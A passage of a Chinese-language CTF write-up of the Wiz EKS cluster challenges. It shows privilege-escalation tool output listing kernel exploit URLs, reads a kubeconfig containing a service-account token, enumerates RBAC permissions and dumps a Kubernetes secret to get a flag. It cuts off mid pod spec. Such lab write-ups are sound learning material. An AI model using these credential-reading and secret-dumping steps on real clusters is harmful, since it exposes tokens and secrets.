class="comment">//blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html</span></span><br><span class="line">   <span class="title class_">Exposure</span>: less probable</span><br><span class="line">   <span class="title class_">Tags</span>: <span class="variable constant_">RHEL</span>=<span class="number">8</span></span><br><span class="line">   <span class="title class_">Download</span> <span class="attr">URL</span>: <span class="attr">https</span>:<span class="comment">//codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk</span></span><br><span class="line">   <span class="title class_">Comments</span>: <span class="variable constant_">CONFIG_SLAB_FREELIST_HARDENED</span> must not be enabled</span><br><span class="line"></span><br><span class="line">[+] [<span class="variable constant_">CVE</span>-<span class="number">2021</span>-<span class="number">22555</span>] <span class="title class_">Netfilter</span> heap out-<span class="keyword">of</span>-bounds write</span><br><span class="line"></span><br><span class="line">   <span class="title class_">Details</span>: <span class="attr">https</span>:<span class="comment">//google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</span></span><br><span class="line">   <span class="title class_">Exposure</span>: less probable</span><br><span class="line">   <span class="title class_">Tags</span>: ubuntu=<span class="number">20.04</span>&#123;<span class="attr">kernel</span>:<span class="number">5.8</span><span class="number">.0</span>-*&#125;</span><br><span class="line">   <span class="title class_">Download</span> <span class="attr">URL</span>: <span class="attr">https</span>:<span class="comment">//raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c</span></span><br><span class="line">   ext-<span class="attr">url</span>: <span class="attr">https</span>:<span class="comment">//raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c</span></span><br><span class="line">   <span class="title class_">Comments</span>: ip_tables kernel <span class="variable language_">module</span> must be loaded</span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Information</span> <span class="title class_">Gathering</span> - <span class="title class_">Sensitive</span> <span class="title class_">Files</span>  ]</span><br><span class="line">        .<span class="property">dockerenv</span> - /.<span class="property">dockerenv</span></span><br><span class="line">        /.<span class="property">bashrc</span> - <span class="regexp">/etc/</span>skel/.<span class="property">bashrc</span></span><br><span class="line">        /.<span class="property">bash_history</span> - <span class="regexp">/home/u</span>ser/.<span class="property">bash_history</span></span><br><span class="line">        /.<span class="property">bashrc</span> - <span class="regexp">/home/u</span>ser/.<span class="property">bashrc</span></span><br><span class="line">        .<span class="property">kube</span>/ - <span class="regexp">/home/u</span>ser/.<span class="property">kube</span>/cache</span><br><span class="line">        .<span class="property">kube</span>/ - <span class="regexp">/home/u</span>ser/.<span class="property">kube</span>/config</span><br><span class="line">        .<span class="property">kube</span>/ - <span class="regexp">/home/u</span>ser/.<span class="property">kube</span>/config.<span class="property">bak</span></span><br><span class="line">        /.<span class="property">bashrc</span> - <span class="regexp">/root/</span>.<span class="property">bashrc</span></span><br><span class="line">        /serviceaccount - <span class="regexp">/var/</span>run/secrets/kubernetes.<span class="property">io</span>/serviceaccount</span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Information</span> <span class="title class_">Gathering</span> - <span class="variable constant_">ASLR</span>  ]</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">34</span> /proc/sys/kernel/randomize_va_space file <span class="attr">content</span>: <span class="number">2</span></span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">34</span> <span class="variable constant_">ASLR</span> is enabled.</span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Information</span> <span class="title class_">Gathering</span> - <span class="title class_">Cgroups</span>  ]</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">34</span> /proc/<span class="number">1</span>/cgroup file <span class="attr">content</span>:</span><br><span class="line">        <span class="number">11</span>:<span class="attr">freezer</span>:/</span><br><span class="line">        <span class="number">10</span>:<span class="attr">blkio</span>:/</span><br><span class="line">        <span class="number">9</span>:<span class="attr">cpuset</span>:/</span><br><span class="line">        <span class="number">8</span>:<span class="attr">hugetlb</span>:/</span><br><span class="line">        <span class="number">7</span>:net_cls,<span class="attr">net_prio</span>:/</span><br><span class="line">        <span class="number">6</span>:<span class="attr">pids</span>:/</span><br><span class="line">        <span class="number">5</span>:<span class="attr">perf_event</span>:/</span><br><span class="line">        <span class="number">4</span>:<span class="attr">devices</span>:/</span><br><span class="line">        <span class="number">3</span>:cpu,<span class="attr">cpuacct</span>:/</span><br><span class="line">        <span class="number">2</span>:<span class="attr">memory</span>:/</span><br><span class="line">        <span class="number">1</span>:name=<span class="attr">systemd</span>:/</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">34</span> /proc/self/cgroup file added <span class="title function_">content</span> (compare pid <span class="number">1</span>) :</span><br></pre></td></tr></table></figure>

<p>看看config文件，收集点有用信息，最开始env没找到集群ip，现在这里是看到了10.100.0.1那么也就确定了B段</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# cat /home/user/.<span class="property">kube</span>/config</span><br><span class="line"><span class="attr">apiVersion</span>: v1</span><br><span class="line"><span class="attr">clusters</span>:</span><br><span class="line">- <span class="attr">cluster</span>:</span><br><span class="line">    certificate-<span class="attr">authority</span>: <span class="regexp">/var/</span>run/secrets/kubernetes.<span class="property">io</span>/serviceaccount/ca.<span class="property">crt</span></span><br><span class="line">    <span class="attr">server</span>: <span class="attr">https</span>:<span class="comment">//10.100.0.1</span></span><br><span class="line">  <span class="attr">name</span>: localcfg</span><br><span class="line"><span class="attr">contexts</span>:</span><br><span class="line">- <span class="attr">context</span>:</span><br><span class="line">    <span class="attr">cluster</span>: localcfg</span><br><span class="line">    <span class="attr">namespace</span>: challenge1</span><br><span class="line">    <span class="attr">user</span>: user</span><br><span class="line">  <span class="attr">name</span>: localcfg</span><br><span class="line">current-<span class="attr">context</span>: localcfg</span><br><span class="line"><span class="attr">kind</span>: <span class="title class_">Config</span></span><br><span class="line"><span class="attr">preferences</span>: &#123;&#125;</span><br><span class="line"><span class="attr">users</span>:</span><br><span class="line">- <span class="attr">name</span>: user</span><br><span class="line">  <span class="attr">user</span>:</span><br><span class="line">    <span class="attr">token</span>: eyJhbGciOiJSUzI1NiIsImtpZCI6ImI4YzE2MTEwNzZiMzY5ZjRmYTQ1YTYxODU3YmE3NGQ0ZjU4YWFkMGQifQ.<span class="property">eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTc1MjAzNDIwOSwiaWF0IjoxNzUyMDMwNjA5LCJpc3MiOiJodHRwczovL29pZGMuZWtzLnVzLXdlc3QtMS5hbWF6b25hd3MuY29tL2lkL0MwNjJDMjA3QzhGNTBERTRFQzI0QTM3MkZGNjBFNTg5Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjaGFsbGVuZ2UxIiwic2VydmljZWFjY291bnQiOnsibmFtZSI6InNlcnZpY2UtYWNjb3VudC1jaGFsbGVuZ2UxIiwidWlkIjoiYjQyMTc5YTYtMjM4Yi00ZDQ2LThkNjAtNDhkNzRkN2MxNDVlIn19LCJuYmYiOjE3NTIwMzA2MDksInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjaGFsbGVuZ2UxOnNlcnZpY2UtYWNjb3VudC1jaGFsbGVuZ2UxIn0</span>.<span class="property">dcrgHH</span>-7DMsXzdFBuEUdJY3Ki1wZGFcloOjTd3yCPRA8_MJfZug76R0wkhaXW8-h5qJr3DTQjoKZEm8YPcFLqFy8w7b1o-<span class="title class_">AAtzGP</span>0i1LDJPKvEM2850FpclB8dg1JipT7UA2lWGsLqEbnQdDwxX0s3FyXvNeCWryzndokPHRCDtkeI19LKzOuDI5qxALDEOkyLvlnxZiJLCu90_BCegosOSVo9Np5meq2lGnC6U3NiTAnNvrbHjoCKtVOjX13DdTNdhgtWZzS-<span class="title class_">RPhvYwnhVQH</span>37_7RO3iElW6zg7UFfTubB6jeC673RIMKxBP0Pe-j9XWW-G2_Q9iuM4NwC21uc-<span class="variable constant_">GQ</span></span><br></pre></td></tr></table></figure>

<p>然后看下k8s版本（这里是eks的自定义版本1.26.15）</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# curl -sk <span class="attr">https</span>:<span class="comment">//10.100.0.1:443/version</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;major&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;minor&quot;</span>: <span class="string">&quot;26+&quot;</span>,</span><br><span class="line">  <span class="string">&quot;gitVersion&quot;</span>: <span class="string">&quot;v1.26.15-eks-4096722&quot;</span>,</span><br><span class="line">  <span class="string">&quot;gitCommit&quot;</span>: <span class="string">&quot;dca25969f8ace2f59a32a74b24b6e2a9933ffb80&quot;</span>,</span><br><span class="line">  <span class="string">&quot;gitTreeState&quot;</span>: <span class="string">&quot;clean&quot;</span>,</span><br><span class="line">  <span class="string">&quot;buildDate&quot;</span>: <span class="string">&quot;2025-04-19T08:20:47Z&quot;</span>,</span><br><span class="line">  <span class="string">&quot;goVersion&quot;</span>: <span class="string">&quot;go1.23.6&quot;</span>,</span><br><span class="line">  <span class="string">&quot;compiler&quot;</span>: <span class="string">&quot;gc&quot;</span>,</span><br><span class="line">  <span class="string">&quot;platform&quot;</span>: <span class="string">&quot;linux/amd64&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>做题做到一半，发现题目给了信息的。。。再加上题目名Secret Seeker那肯定是要去get secrets了</p>
<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%201qwtqwtq.png?imageSlim" alt="image.png"></p>
<p>当然，排开题目信息，如果自己完全不知道呢？</p>
<p>如何查看对secrets自己拥有的权限？</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查看当前serviceAccount的权限：</span><br><span class="line">kubectl auth can-i --list</span><br><span class="line">kubectl auth can-i get secrets</span><br><span class="line">kubectl auth can-i list secrets</span><br><span class="line"></span><br><span class="line">也可以加上 --<span class="keyword">as</span> 参数去测试别的身份：（前提是如果有权限模拟）</span><br><span class="line">kubectl auth can-i get secrets --<span class="keyword">as</span>=<span class="attr">system</span>:<span class="attr">serviceaccount</span>:<span class="attr">challenge1</span>:service-account-challenge1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%202qtqwt.png?imageSlim" alt="image.png"></p>
<p>列举secrets依据获取某个secret的内容</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get secrets</span><br><span class="line"><span class="variable constant_">NAME</span>         <span class="variable constant_">TYPE</span>     <span class="variable constant_">DATA</span>   <span class="variable constant_">AGE</span></span><br><span class="line">log-rotate   <span class="title class_">Opaque</span>   <span class="number">1</span>      615d</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get secrets log-rotate -o yaml</span><br><span class="line"><span class="attr">apiVersion</span>: v1</span><br><span class="line"><span class="attr">data</span>:</span><br><span class="line">  <span class="attr">flag</span>: d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==</span><br><span class="line"><span class="attr">kind</span>: <span class="title class_">Secret</span></span><br><span class="line"><span class="attr">metadata</span>:</span><br><span class="line">  <span class="attr">creationTimestamp</span>: <span class="string">&quot;2023-11-01T13:02:08Z&quot;</span></span><br><span class="line">  <span class="attr">name</span>: log-rotate</span><br><span class="line">  <span class="attr">namespace</span>: challenge1</span><br><span class="line">  <span class="attr">resourceVersion</span>: <span class="string">&quot;890951&quot;</span></span><br><span class="line">  <span class="attr">uid</span>: 03f6372c-b728-4c5b-ad28-70d5af8d387c</span><br><span class="line"><span class="attr">type</span>: <span class="title class_">Opaque</span></span><br></pre></td></tr></table></figure>

<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%203qtqwt.png?imageSlim" alt="image.png"></p>
<p>拿到flag：wiz_eks_challenge{omg_over_privileged_secret_access}</p>
<h1 id="Registry-Hunt"><a href="#Registry-Hunt" class="headerlink" title="Registry Hunt"></a>Registry Hunt</h1><p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%204ghhwhew.png?imageSlim" alt="image.png"></p>
<p>有以下权限</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;secrets&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;pods&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;list&quot;</span>,</span><br><span class="line">        <span class="string">&quot;get&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl auth can-i --list</span><br><span class="line"><span class="attr">warning</span>: the list may be <span class="attr">incomplete</span>: webhook authorizer does not support user rule resolution</span><br><span class="line"><span class="title class_">Resources</span>                                       <span class="title class_">Non</span>-<span class="title class_">Resource</span> <span class="title class_">URLs</span>                     <span class="title class_">Resource</span> <span class="title class_">Names</span>     <span class="title class_">Verbs</span></span><br><span class="line">selfsubjectaccessreviews.<span class="property">authorization</span>.<span class="property">k8s</span>.<span class="property">io</span>   []                                    []                 [create]</span><br><span class="line">selfsubjectrulesreviews.<span class="property">authorization</span>.<span class="property">k8s</span>.<span class="property">io</span>    []                                    []                 [create]</span><br><span class="line">                                                [<span class="regexp">/.well-known/</span>openid-configuration]   []                 [get]</span><br><span class="line">                                                [<span class="regexp">/api/</span>*]                              []                 [get]</span><br><span class="line">                                                [/api]                                []                 [get]</span><br><span class="line">                                                [<span class="regexp">/apis/</span>*]                             []                 [get]</span><br><span class="line">                                                [/apis]                               []                 [get]</span><br><span class="line">                                                [/healthz]                            []                 [get]</span><br><span class="line">                                                [/healthz]                            []                 [get]</span><br><span class="line">                                                [/livez]                              []                 [get]</span><br><span class="line">                                                [/livez]                              []                 [get]</span><br><span class="line">                                                [<span class="regexp">/openapi/</span>*]                          []                 [get]</span><br><span class="line">                                                [/openapi]                            []                 [get]</span><br><span class="line">                                                [<span class="regexp">/openid/</span>v1/jwks]                     []                 [get]</span><br><span class="line">                                                [/readyz]                             []                 [get]</span><br><span class="line">                                                [/readyz]                             []                 [get]</span><br><span class="line">                                                [<span class="regexp">/version/</span>]                           []                 [get]</span><br><span class="line">                                                [<span class="regexp">/version/</span>]                           []                 [get]</span><br><span class="line">                                                [/version]                            []                 [get]</span><br><span class="line">                                                [/version]                            []                 [get]</span><br><span class="line">secrets                                         []                                    []                 [get]</span><br><span class="line">pods                                            []                                    []                 [list get]</span><br><span class="line">podsecuritypolicies.<span class="property">policy</span>                      []                                    [eks.<span class="property">privileged</span>]   [use]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我发现了一个有趣的问题，我平时在本地k8s集群都喜欢带一个-A参数没啥问题</p>
<p>但是在这里为啥有个报错？也是之前学的马虎，查了一下，这个-A参数列举的是所有命名空间的pods</p>
<p><strong>但是这里没有集群范围（cluster-scope）列出 Pod 的权限，但在当前命名空间下有权限。</strong></p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get pods -A</span><br><span class="line"><span class="title class_">Error</span> <span class="keyword">from</span> <span class="title function_">server</span> (<span class="title class_">Forbidden</span>): pods is <span class="attr">forbidden</span>: <span class="title class_">User</span> <span class="string">&quot;system:serviceaccount:challenge2:service-account-challenge2&quot;</span> cannot list resource <span class="string">&quot;pods&quot;</span> <span class="keyword">in</span> <span class="variable constant_">API</span> group <span class="string">&quot;&quot;</span> at the cluster scope</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get pods   </span><br><span class="line"><span class="variable constant_">NAME</span>                    <span class="variable constant_">READY</span>   <span class="variable constant_">STATUS</span>    <span class="variable constant_">RESTARTS</span>       <span class="variable constant_">AGE</span></span><br><span class="line">database-pod-2c9b3a4e   <span class="number">1</span>/<span class="number">1</span>     <span class="title class_">Running</span>   <span class="number">16</span> (35d ago)   615d</span><br></pre></td></tr></table></figure>

<p>列举pod下的容器，但是进不去容器，需要有create权限</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get pod database-pod-2c9b3a4e -o jsonpath=<span class="string">&#x27;&#123;.spec.containers[*].name&#125;&#x27;</span></span><br><span class="line">my-container</span><br><span class="line"></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl exec -it database-pod-2c9b3a4e -c my-container -- <span class="regexp">/bin/</span>sh</span><br><span class="line"><span class="title class_">Error</span> <span class="keyword">from</span> <span class="title function_">server</span> (<span class="title class_">Forbidden</span>): pods <span class="string">&quot;database-pod-2c9b3a4e&quot;</span> is <span class="attr">forbidden</span>: <span class="title class_">User</span> <span class="string">&quot;system:serviceaccount:challenge2:service-account-challenge2&quot;</span> cannot create resource <span class="string">&quot;pods/exec&quot;</span> <span class="keyword">in</span> <span class="variable constant_">API</span> group <span class="string">&quot;&quot;</span> <span class="keyword">in</span> the namespace <span class="string">&quot;challenge2&quot;</span></span><br></pre></td></tr></table></figure>

<p>再看看容器pod的具体信息</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get pod database-pod-2c9b3a4e -o json</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;Pod&quot;</span>,</span><br><span class="line">    <span class="string">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;annotations&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;kubernetes.io/psp&quot;</span>: <span class="string">&quot;eks.privileged&quot;</span>,</span><br><span class="line">            <span class="string">&quot;pulumi.com/autonamed&quot;</span>: <span class="string">&quot;true&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;creationTimestamp&quot;</span>: <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;database-pod-2c9b3a4e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;namespace&quot;</span>: <span class="string">&quot;challenge2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;resourceVersion&quot;</span>: <span class="string">&quot;247278778&quot;</span>,</span><br><span class="line">        <span class="string">&quot;uid&quot;</span>: <span class="string">&quot;57fe7d43-5eb3-4554-98da-47340d94b4a6&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;spec&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;containers&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;image&quot;</span>: <span class="string">&quot;eksclustergames/base_ext_image&quot;</span>,</span><br><span class="line">                <span class="string">&quot;imagePullPolicy&quot;</span>: <span class="string">&quot;Always&quot;</span>,</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;my-container&quot;</span>,</span><br><span class="line">                <span class="string">&quot;resources&quot;</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">&quot;terminationMessagePath&quot;</span>: <span class="string">&quot;/dev/termination-log&quot;</span>,</span><br><span class="line">                <span class="string">&quot;terminationMessagePolicy&quot;</span>: <span class="string">&quot;File&quot;</span>,</span><br><span class="line">                <span class="string">&quot;volumeMounts&quot;</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;mountPath&quot;</span>: <span class="string">&quot;/var/run/secrets/kubernetes.io/serviceaccount&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;kube-api-access-cq4m2&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;readOnly&quot;</span>: <span class="literal">true</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;dnsPolicy&quot;</span>: <span class="string">&quot;ClusterFirst&quot;</span>,</span><br><span class="line">        <span class="string">&quot;enableServiceLinks&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;imagePullSecrets&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;registry-pull-secrets-780bab1d&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;nodeName&quot;</span>: <span class="string">&quot;ip-192-168-21-50.us-west-1.compute.internal&quot;</span>,</span><br><span class="line">        <span class="string">&quot;preemptionPolicy&quot;</span>: <span class="string">&quot;PreemptLowerPriority&quot;</span>,</span><br><span class="line">        <span class="string">&quot;priority&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;restartPolicy&quot;</span>: <span class="string">&quot;Always&quot;</span>,</span><br><span class="line">        <span class="string">&quot;schedulerName&quot;</span>: <span class="string">&quot;default-scheduler&quot;</span>,</span><br><span class="line">        <span class="string">&quot;securityContext&quot;</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&quot;serviceAccount&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">        <span class="string">&quot;serviceAccountName&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">        <span class="string">&quot;terminationGracePeriodSeconds&quot;</span>: <span class="number">30</span>,</span><br><span class="line">        <span class="string">&quot;tolerations&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;effect&quot;</span>: <span class="string">&quot;NoExecute&quot;</span>,</span><br><span class="line">                <span class="string">&quot;key&quot;</span>: <span class="string">&quot;node.kubernetes.io/not-ready&quot;</span>,</span><br><span class="line">                <span class="string">&quot;operator&quot;</span>: <span class="string">&quot;Exists&quot;</span>,</span><br><span class="line">                <span class="string">&quot;tolerationSeconds&quot;</span>: <span class="number">300</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;effect&quot;</span>: <span class="string">&quot;NoExecute&quot;</span>,</span><br><span class="line">                <span class="string">&quot;key&quot;</span>: <span class="string">&quot;node.kubernetes.io/unreachable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;operator&quot;</span>: <span class="string">&quot;Exists&quot;</span>,</span><br><span class="line">                <span class="string">&quot;tolerationSeconds&quot;</span>: <span class="number">300</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;volumes&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;kube-api-access-cq4m2&quot;</span>,</span><br><span class="line">                <span class="string">&quot;projected&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;defaultMode&quot;</span>: <span class="number">420</span>,</span><br><span class="line">                    <span 